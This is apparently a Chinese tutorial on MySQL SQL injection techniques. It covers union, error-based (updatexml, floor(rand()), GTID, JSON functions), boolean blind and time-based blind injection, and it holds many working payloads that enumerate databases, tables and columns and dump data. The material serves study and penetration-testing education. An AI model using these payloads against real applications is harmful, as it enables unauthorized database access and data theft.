## 注释

```
1. #xxx
2. -- xxx 注意有一个空格
3. /*xxx*/
4. `xxx`
5. ;%00
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201202343264.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201202344062.png)

## 常用注入手段

### 联合查询注入

联合查询注入即在原有的查询语句中,通过`union`拼接传入的恶意语句,达到获取数据的目的(常用于有回显的情况)

正常查询语句 `select column_name from table where xxx`

恶意查询语句 `select column_name from table where xxx union select column_name (from table where xxx)`()可选

使用`union`进行拼接时,前后两个`select`语句所返回的字段数必须一致

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201210003541.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201210004035.png)

若仅回显一行数据则需要将部分`column_name`设置为空

### 报错注入

mysql在报错信息里可能会带有部分数据,利用这一特性进行注入,但要注意数据外带的长度限制

报错注入主要有以下几种

#### 数据类型溢出

在mysql版本大于`5.5`时才会产生溢出报错

[https://dev.mysql.com/doc/refman/5.7/en/integer-types.html](https://dev.mysql.com/doc/refman/5.7/en/integer-types.html)

[https://dev.mysql.com/doc/refman/5.7/en/out-of-range-and-overflow.html](https://dev.mysql.com/doc/refman/5.7/en/out-of-range-and-overflow.html)

|Type|Storage (Bytes)|Minimum Value Signed|Minimum Value Unsigned|Maximum Value Signed|Maximum Value Unsigned|
|:---:|:---:|:---:|:---:|:---:|:---:|
|TINYINT|1|-128|0|127|255|
|SMALLINT|2|-32768|0|32767|65535|
|MEDIUMINT|3|-8388608|0|8388607|16777215|
|INT|4|-2147483648|0|2147483647|4294967295|
|BIGINT|8|-2^63|0|2^63-1|2^64-1|

`2^64-1=18446744073709551615`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211058286.png)

如果一个查询成功执行,则其返回值为0,因此可以利用该返回值进行数学运算

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211134646.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211135283.png)

但是整型溢出报错并带出数据只能在某些特定版本使用,在版本大于`5.5.48`时报错不能带出数据

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211449716.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211451073.png)

>`exp()`此函数返回e(自然对数的底)的x次方的值

>`pow()`指数运算

>`cot()`cotan

```
select exp(~(select*from(select @@version)x));
select pow(2,~(select*from(select @@version)x));
select cot(!(select*from(select @@version)x));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211510567.png)

```
select !atan((select*from(select @@version)x))-~0;
select !cos((select*from(select @@version)x))-~0;
select !ceil((select*from(select @@version)x))-~0;
select !floor((select*from(select @@version)x))-~0;
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211417654.png)

#### 特殊的数学函数

几何对象函数

```
select multipoint((select*from(select*from(select @@version)x)y));
select geometrycollection((select*from(select*from(select @@version)x)y));
select polygon((select*from(select*from(select @@version)x)y));
select multipolygon((select*from(select*from(select @@version)x)y));
select linestring((select*from(select*from(select @@version)x)y));
select multilinestring((select*from(select*from(select @@version)x)y));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211426633.png)

空间函数

```
select ST_LongFromGeoHash((select*from(select*from(select @@version)x)y));
select ST_LatFromGeoHash((select*from(select*from(select @@version)x)y));
select ST_PointFromGeoHash((select*from(select*from(select @@version)x)y),1);
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211435901.png)

#### xpath语法错误

`ExtractValue()`和`UpdateXML()`

`ExtractValue(xml_frag, xpath_expr)`

`UpdateXML(xml_target, xpath_expr, new_xml)`

第二个参数都要求符合xpath语法,如果不符合就会报错并带有数据,通过在前后添加`~`即`0x7e`使其不符合xpath格式从而报错

```
select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
select extractvalue(1,concat(0x7e,(select @@version),0x7e));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211521265.png)

#### 重复数据报错

主键具有唯一性,主键重复则会报错

```
select * from table3;
+----+------+
| id | info |
+----+------+
| 1  | a    |
| 2  | a    |
| 3  | b    |
| 4  | c    |
| 5  | c    |
+----+------+
```

`select count(*) from table3 group by info;`

首先建立一个空的虚拟表

|info(primary key)|count|
|:---:|:---:|
|||

从数据库中查询数据,检查虚拟表是否存在对应条目,不存在则插入新记录,存在则count字段加1

|info(primary key)|count|
|:---:|:---:|
|a|1|

|info(primary key)|count|
|:---:|:---:|
|a|2|

|info(primary key)|count|
|:---:|:---:|
|a|2|
|b|1|

|info(primary key)|count|
|:---:|:---:|
|a|2|
|b|1|
|c|1|

|info(primary key)|count|
|:---:|:---:|
|a|2|
|b|1|
|c|2|

`rand()`不能接在`order by/group by`后面

[https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand](https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)

RAND() in a WHERE clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). Thus, for optimizer purposes, RAND() is not a constant value and cannot be used for index optimizations

Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result

```
select floor(rand(0)*2) from `TABLES` limit 8;
+------------------+
| floor(rand(0)*2) |
+------------------+
| 0.0              |
| 1.0              |
| 1.0              |
| 0.0              |
| 1.0              |
| 1.0              |
| 0.0              |
| 0.0              |
+------------------+
```

`select count(*) from table3 group by floor(rand(0)*2);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212150136.png)

>`group by`只有在插入虚拟表时才会计算rand,更新时不会计算

首先,`group by floor(rand(0)*2)`被执行确定为`group by 0`,此时虚拟表为空,进行插入操作,此时`floor(rand(0)*2)`结果为`1`

已执行两次`rand`计算

|primary key|count|
|:---:|:---:|
|1|1|

然后,`group by floor(rand(0)*2)`被执行确定为`group by 1`,此时虚拟表存在该项`count+1`

已执行三次`rand`计算

|primary key|count|
|:---:|:---:|
|1|2|

然后,`group by floor(rand(0)*2)`被执行确定为`group by 0`,此时虚拟表不存在该项,进行插入操作,此时`floor(rand(0)*2)`结果为`1`,将要插入`1`但是此时虚拟表已存在`1`,因此主键冲突产生报错

已执行五次`rand`计算

因此表中需要有至少三条数据供`floor(rand(0)*2)`达到报错条件

```
select floor(rand(14)*2) from `TABLES` limit 4;
+-------------------+
| floor(rand(14)*2) |
+-------------------+
| 1.0               |
| 0.0               |
| 1.0               |
| 0.0               |
+-------------------+
```

>floor(rand(14)*2)产生随机序列1010...,因此表中可以只有两条数据

>如何利用该报错?

爆破库名

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212218318.png)

爆破表名

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212222673.png)

爆破列名

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='table3' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='table3' limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212227064.png)

爆破字段

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select group_concat(id) from table3),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select mid(group_concat(info),1,100) from table3),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212338165.png)

```
select column_name,column_type from information_schema.columns where table_name='table3';
+-------------+--------------+
| column_name | column_type  |
+-------------+--------------+
| id          | int(11)      |
| info        | varchar(255) |
+-------------+--------------+
```

---

列名具有唯一性,列名重复则会报错,利用这一特性可以进行无列名注入

>例子

利用name_const来制造一个列,但参数需要是常量(The arguments should be constants)

[https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const](https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211544831.png)

>无列名注入

[MySQL JOIN 菜鸟教程](https://www.runoob.com/mysql/mysql-join.html)

通过`join`可建立两个表之间的内连接,通过对要查询列名的表与其自身进行内连接,会产生的相同列名,从而发生错误带出数据(即列名)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211800660.png)

`using()`用于两张表之间的`join`连接查询,并且`using()`中的列在两张表中都存在,由此剔除掉前一次注入时得到的列名

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211803273.png)

```
select * from(select * from table1 as a join table1 as b)c;
select * from(select * from table1 as a join table1 as b using (id))c;
select * from(select * from table1 as a join table1 as b using (id,username))c;
```

#### 调用不存在的函数可读取数据库名字

```
select misaka();
(1305, 'FUNCTION sql_injection_test.misaka does not exist')
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212343727.png)

#### GTID函数

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242037203.png)

```
select gtid_subset(user(),1);
(1772, "Malformed GTID set specification 'root@172.18.0.1'.")
select gtid_subtract(user(),1);
(1772, "Malformed GTID set specification 'root@172.18.0.1'.")
select gtid_subtract((select group_concat(id) from sql_injection_test.table1),1);
(1772, "Malformed GTID set specification '1,2,3,4'.")
select gtid_subtract((select group_concat(username) from sql_injection_test.table1),1);
(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242045868.png)

```
select * from table1 where id='1' and gtid_subtract((select group_concat(username) from sql_injection_test.table1),1)='1'#
(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
select * from table1 where id='1' or gtid_subtract((select group_concat(username) from sql_injection_test.table1),1)='1'#
(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
```

#### JSON函数

据说有版本限制,未进行验证(当前测试版本为`5.7.11`)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242106092.png)

```
select json_array_append(user(),null,null);
(3141, 'Invalid JSON text in argument 1 to function json_array_append: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_array_append(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_array_append: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_array_insert(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_array_insert: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_insert(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_insert: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_merge(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_merge: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_merge_patch(user(),1,2);
(1305, 'FUNCTION information_schema.json_merge_patch does not exist')
select json_remove(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_remove: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_replace(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_replace: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_set(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_set: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
```

#### UUID

版本限制(大于`8.0`)

[https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html](https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242124969.png)

```
select uuid_to_bin(user())
(1411, "Incorrect string value: 'root@192.168.241.1' for function uuid_to_bin")
select bin_to_uuid(user())
(1411, "Incorrect string value: 'root@192.168.241.1' for function bin_to_uuid")
```

### 布尔注入

服务器根据sql语句的执行结果返回`success`或者是`fail`,通过构造语句利用服务器的返回值来判断数据是否符合预期

`select * from user where username='$username'`

`select * from user where username='$username' or 1#`构造永真条件,无论输入的用户名是什么都会返回`success`

```
select * from table3 where id='1' and length(database())>1
+----+------+
| id | info |
+----+------+
| 1  | a    |
+----+------+
1 row in set
Time: 0.008s
select * from table3 where id='1' and length(database())<1
+----+------+
| id | info |
+----+------+
0 rows in set
Time: 0.011s
```

```
select * from table3 where id='1' and mid((select group_concat(info) from table3),1,1)<50
+----+------+
| id | info |
+----+------+
| 1  | a    |
+----+------+
1 row in set
Time: 0.008s
select * from table3 where id='1' and mid((select group_concat(info) from table3),1,1)>50
+----+------+
| id | info |
+----+------+
0 rows in set
Time: 0.010s
```

### 延时注入

构造延时注入语句,根据服务器响应时间判断数据是否符合预期,常用于盲注

1. sleep

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212353818.png)

`select * from table3 where id='1' and if (length(database())>5,sleep(5),1)#`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212355619.png)

`select * from table3 where id='1' and if (ascii(substr((select group_concat(info) from table3),1,1))>50,sleep(5),1)#`

2. benchmark

`BENCHMARK(count,exp)`重复执行`count`次`exp`中的内容,其返回值为0

```
SELECT BENCHMARK(1000000,1+1);
+------------------------+
| BENCHMARK(1000000,1+1) |
+------------------------+
| 0                      |
+------------------------+
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201220004326.png)

`select * from table3 where id='1' and if (ascii(substr((select group_concat(info) from table3),1,1))>50,benchmark(10e7,1+1),1)#`

3. 笛卡尔积

可以大量消耗服务器资源

```
SELECT count(*) FROM information_schema.columns;
+----------+
| count(*) |
+----------+
| 3087     |
+----------+
1 row in set
Time: 0.030s
SELECT count(*) FROM information_schema.columns A,information_schema.columns B;
+----------+
| count(*) |
+----------+
| 9529569  |
+----------+
1 row in set
Time: 0.289s
SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;
跑很久...
```

```
select * from table3 where id='-1' or if (length(database())<1,(select count(*) from information_schema.columns a,information_schema.columns b),1)#
+----+------+
| id | info |
+----+------+
| 1  | a    |
| 2  | a    |
| 3  | b    |
| 4  | c    |
| 5  | c    |
+----+------+
5 rows in set
Time: 0.018s
select * from table3 where id='-1' or if (length(database())>1,(select count(*) from information_schema.columns a,information_schema.columns b),1)#
+----+------+
| id | info |
+----+------+
| 1  | a    |
| 2  | a    |
| 3  | b    |
| 4  | c    |
| 5  | c    |
+----+------+
5 rows in set
Time: 0.361s
```

1. get_lock

[https://dev.mysql.com/doc/refman/5.7/en/locking-functions.html](https://dev.mysql.com/doc/refman/5.7/en/locking-functions.html)

`GET_LOCK(str,timeout)`

尝试对`str`加锁,超时时间为`timeout`秒,负值`timeout`表示无限超时

在一个`session`中可以先锁定一个变量`select get_lock('misaka',1);`

然后通过另一个`session`再次执行get_lock函数`select get_lock('misaka',5);`此时会产生5秒的延迟，

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221227308.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201222322928.png)

`select * from table3 where id='-1' or if (length(database())>1,(select get_lock('misaka',5)),1)#`

5. rpad/repeat

构造恶意的正则匹配去消耗服务器资源,从而达到延时注入的目的

[RPAD(str,len,padstr)](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_rpad)

```
mysql> SELECT RPAD('hi',5,'?');
        -> 'hi???'
mysql> SELECT RPAD('hi',1,'?');
        -> 'h'
```

[REPEAT(str,count)](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_repeat)

```
mysql> SELECT REPEAT('MySQL', 3);
        -> 'MySQLMySQLMySQL'
```

首先利用`repeat`或者`rpad`构造超长的待匹配字符串,然后再次利用这两个函数去构造正则匹配规则,利用匹配规则进行多次匹配(通过`repeat`中的数据量来控制延迟时间)

```
select rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',100),'b');
+-------------------------------------------------------------+
| rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',100),'b') |
+-------------------------------------------------------------+
| 0                                                           |
+-------------------------------------------------------------+
1 row in set
Time: 0.726s

select rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b');
+-------------------------------------------------------------+
| rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b') |
+-------------------------------------------------------------+
| 0                                                           |
+-------------------------------------------------------------+
1 row in set
Time: 3.869s
```

```
select * from table1 where id='1' or if(length(database())>1,rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b'),0);
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
+----+----------+----------+-----------------+
1 row in set
Time: 3.297s
select * from table1 where id='1' or if(length(database())<1,rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b'),0);
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
+----+----------+----------+-----------------+
1 row in set
Time: 0.009s
```

### 堆叠注入

即多语句执行,例题可以参照sqli-labs的Less-38

### 二次注入

>todo